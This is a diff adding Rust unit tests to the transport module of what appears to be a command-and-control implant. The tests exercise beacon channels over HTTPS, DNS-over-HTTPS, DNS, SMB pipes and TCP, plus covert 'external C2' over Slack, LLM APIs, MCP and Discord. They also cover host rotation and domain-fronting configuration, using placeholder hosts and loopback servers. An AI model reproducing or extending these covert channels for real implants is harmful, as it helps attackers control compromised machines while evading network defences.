@@ -359,3 +359,232 @@ pub fn select_rotation_host(rotation_hosts: &str) -> Option<&[u8]> {
 pub fn advance_rotation_host() {
     ROTATION_IDX.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::testutil;
+    use core::sync::atomic::Ordering;
+    use std::time::Duration;
+
+    #[test]
+    fn channel_from_u8_maps_all_wire_values() {
+        assert_eq!(Channel::from_u8(0), Channel::Https);
+        assert_eq!(Channel::from_u8(1), Channel::DohDns);
+        assert_eq!(Channel::from_u8(2), Channel::Dns);
+        assert_eq!(Channel::from_u8(3), Channel::SmbPipe);
+        assert_eq!(Channel::from_u8(4), Channel::Tcp);
+        assert_eq!(Channel::from_u8(5), Channel::SlackApi);
+        assert_eq!(Channel::from_u8(6), Channel::LlmApi);
+        assert_eq!(Channel::from_u8(7), Channel::Mcp);
+        assert_eq!(Channel::from_u8(8), Channel::DiscordApi);
+        // Unknown values fall back to Https rather than panicking.
+        assert_eq!(Channel::from_u8(9), Channel::Https);
+        assert_eq!(Channel::from_u8(255), Channel::Https);
+    }
+
+    #[test]
+    fn channel_from_wire_u8_legacy_shim() {
+        // Unambiguous values map straight through.
+        assert_eq!(Channel::from_wire_u8(0), Channel::Https);
+        assert_eq!(Channel::from_wire_u8(1), Channel::DohDns);
+        // Legacy numbering: 2/3/4 were Slack/Llm/Mcp in the old enum.
+        assert_eq!(Channel::from_wire_u8(2), Channel::SlackApi);
+        assert_eq!(Channel::from_wire_u8(3), Channel::LlmApi);
+        assert_eq!(Channel::from_wire_u8(4), Channel::Mcp);
+        // Old WebTrans=5 has no equivalent → Https; old SmbPipe=6 → new 3.
+        assert_eq!(Channel::from_wire_u8(5), Channel::Https);
+        assert_eq!(Channel::from_wire_u8(6), Channel::SmbPipe);
+        // New-only values pass through; unknown → Https.
+        assert_eq!(Channel::from_wire_u8(7), Channel::Mcp);
+        assert_eq!(Channel::from_wire_u8(8), Channel::DiscordApi);
+        assert_eq!(Channel::from_wire_u8(42), Channel::Https);
+    }
+
+    #[test]
+    fn channel_names_are_stable() {
+        // The name strings surface in operator logs; pin them down.
+        let expected = [
+            (Channel::Https, "https"),
+            (Channel::DohDns, "doh-dns"),
+            (Channel::Dns, "dns"),
+            (Channel::SmbPipe, "smb-pipe"),
+            (Channel::Tcp, "tcp"),
+            (Channel::SlackApi, "slack-api"),
+            (Channel::LlmApi, "llm-api"),
+            (Channel::Mcp, "mcp"),
+            (Channel::DiscordApi, "discord-api"),
+        ];
+        for (ch, name) in expected {
+            assert_eq!(ch.name(), name);
+            assert!(ch.is_implemented());
+        }
+    }
+
+    #[test]
+    fn set_active_get_active_roundtrip() {
+        set_active(Channel::DohDns);
+        assert_eq!(get_active(), Channel::DohDns);
+        set_active(Channel::Tcp);
+        assert_eq!(get_active(), Channel::Tcp);
+        // Restore the default so other tests observing the atomic are unaffected.
+        set_active(Channel::Https);
+        assert_eq!(get_active(), Channel::Https);
+    }
+
+    #[test]
+    fn next_fallback_walks_chain_then_exhausts() {
+        assert_eq!(next_fallback(Channel::Https), Some(Channel::DohDns));
+        assert_eq!(next_fallback(Channel::DohDns), Some(Channel::Dns));
+        // Chain exhausted → None (caller long-sleeps and resets to primary).
+        assert_eq!(next_fallback(Channel::Dns), None);
+        // Channels outside the chain have no automatic fallback.
+        assert_eq!(next_fallback(Channel::Tcp), None);
+        assert_eq!(next_fallback(Channel::SmbPipe), None);
+        assert_eq!(next_fallback(Channel::SlackApi), None);
+        assert_eq!(PRIMARY_CHANNEL, Channel::Https);
+    }
+
+    #[test]
+    fn rotation_host_select_hold_advance_wrap() {
+        // Single test fn for all ROTATION_IDX assertions: the index is a
+        // shared static and parallel tests must not interleave on it.
+        ROTATION_IDX.store(0, Ordering::Relaxed);
+        // Empty / separator-only lists select nothing (caller uses server_host).
+        assert_eq!(select_rotation_host(""), None);
+        assert_eq!(select_rotation_host(" ,  ,"), None);
+        let hosts = "alpha.example, beta.example gamma.example";
+        assert_eq!(
+            select_rotation_host(hosts),
+            Some(b"alpha.example".as_slice())
+        );
+        // CS 4.10 hold: selecting does NOT advance — same host again.
+        assert_eq!(
+            select_rotation_host(hosts),
+            Some(b"alpha.example".as_slice())
+        );
+        advance_rotation_host();
+        assert_eq!(select_rotation_host(hosts), Some(b"beta.example".as_slice()));
+        advance_rotation_host();
+        assert_eq!(
+            select_rotation_host(hosts),
+            Some(b"gamma.example".as_slice())
+        );
+        // A full cycle wraps back to the first host (fail-hold retry).
+        advance_rotation_host();
+        assert_eq!(
+            select_rotation_host(hosts),
+            Some(b"alpha.example".as_slice())
+        );
+        // Single-host list always selects that host regardless of index.
+        ROTATION_IDX.store(7, Ordering::Relaxed);
+        assert_eq!(
+            select_rotation_host("only.example"),
+            Some(b"only.example".as_slice())
+        );
+        ROTATION_IDX.store(0, Ordering::Relaxed);
+    }
+
+    #[test]
+    fn channel_ctx_from_config_copies_all_fields() {
+        use nyx_implant_core::config::Config;
+        let cfg = Config {
+            server_host: String::from("c2.example.com"),
+            server_port: 8443,
+            beacon_uri: String::from("/beacon"),
+            server_pub: [0u8; 32],
+            sleep_seconds: 5,
+            jitter_pct: 20,
+            use_tls: true,
+            primary_channel: 0,
+            fallback_bitmap: 0,
+            doh_resolver: String::from("cloudflare-dns.com"),
+            smb_pipe_name: String::from("\\\\.\\pipe\\nyx_test"),
+            extc2_api_host: String::from("slack.com"),
+            extc2_token: String::from("xoxb-test"),
+            rotation_hosts: String::from("cdn1.example,cdn2.example"),
+            fronting_host: String::from("front.example"),
+            proxy_server: String::from("127.0.0.1:8080"),
+            tcp_peer_host: String::from("10.0.0.5"),
+            tcp_peer_port: 4444,
+        };
+        let ctx = ChannelCtx::from_config(&cfg);
+        assert_eq!(ctx.server_host, "c2.example.com");
+        assert_eq!(ctx.server_port, 8443);
+        assert!(ctx.use_tls);
+        assert_eq!(ctx.doh_resolver, "cloudflare-dns.com");
+        assert_eq!(ctx.smb_pipe_name, "\\\\.\\pipe\\nyx_test");
+        assert_eq!(ctx.extc2_api_host, "slack.com");
+        assert_eq!(ctx.extc2_token, "xoxb-test");
+        assert_eq!(ctx.rotation_hosts, "cdn1.example,cdn2.example");
+        assert_eq!(ctx.fronting_host, "front.example");
+        assert_eq!(ctx.proxy_server, "127.0.0.1:8080");
+        assert_eq!(ctx.tcp_peer_host, "10.0.0.5");
+        assert_eq!(ctx.tcp_peer_port, 4444);
+    }
+
+    // ---- Dispatcher loopback tests (real WinHTTP transactions under wine) ----
+
+    /// Dispatch one frame through `ch` against a one-shot loopback server and
+    /// assert the response round-trips and the request hit `expected_path`.
+    fn assert_dispatch_hits_path(ch: Channel, expected_path: &str, configure: impl Fn(&mut ChannelCtx)) {
+        let (port, rx) = testutil::one_shot_http_server(testutil::server_wire_response(b"TASKS"));
+        let mut ctx = testutil::ctx("127.0.0.1", port);
+        configure(&mut ctx);
+        let out = unsafe { dispatch_send_recv(&ctx, ch, b"PING") };
+        assert_eq!(
+            out.as_deref(),
+            Some(b"TASKS".as_slice()),
+            "{ch:?} round-trip failed"
+        );
+        let cap = rx
+            .recv_timeout(Duration::from_secs(15))
+            .expect("server captured request");
+        assert!(
+            cap.request_line.starts_with(&format!("POST {expected_path} ")),
+            "{ch:?} hit {:?}, expected path {expected_path}",
+            cap.request_line
+        );
+    }
+
+    #[test]
+    fn dispatch_https_posts_to_beacon_path() {
+        assert_dispatch_hits_path(Channel::Https, "/beacon", |_| {});
+    }
+
+    #[test]
+    fn dispatch_doh_posts_to_doh_path() {
+        assert_dispatch_hits_path(Channel::DohDns, "/doh", |_| {});
+    }
+
+    #[test]
+    fn dispatch_dns_posts_to_dns_path() {
+        assert_dispatch_hits_path(Channel::Dns, "/dns", |_| {});
+    }
+
+    #[test]
+    fn dispatch_extc2_channels_hit_per_service_paths() {
+        let configure = |ctx: &mut ChannelCtx| {
+            ctx.extc2_api_host = String::from("provider.example");
+            ctx.extc2_token = String::from("tok");
+        };
+        assert_dispatch_hits_path(Channel::SlackApi, "/extc2/slack", configure);
+        assert_dispatch_hits_path(Channel::LlmApi, "/extc2/llm", configure);
+        assert_dispatch_hits_path(Channel::Mcp, "/extc2/mcp", configure);
+        assert_dispatch_hits_path(Channel::DiscordApi, "/extc2/discord", configure);
+    }
+
+    #[test]
+    fn dispatch_smb_without_pipe_fails_fast() {
+        // No smb_pipe_name configured → None without touching the network.
+        let ctx = testutil::ctx("127.0.0.1", 9);
+        assert!(unsafe { dispatch_send_recv(&ctx, Channel::SmbPipe, b"x") }.is_none());
+    }
+
+    #[test]
+    fn dispatch_tcp_without_peer_fails_fast() {
+        // No tcp_peer_host configured → None without touching the network.
+        let ctx = testutil::ctx("127.0.0.1", 9);
+        assert!(unsafe { dispatch_send_recv(&ctx, Channel::Tcp, b"x") }.is_none());
+    }
+}
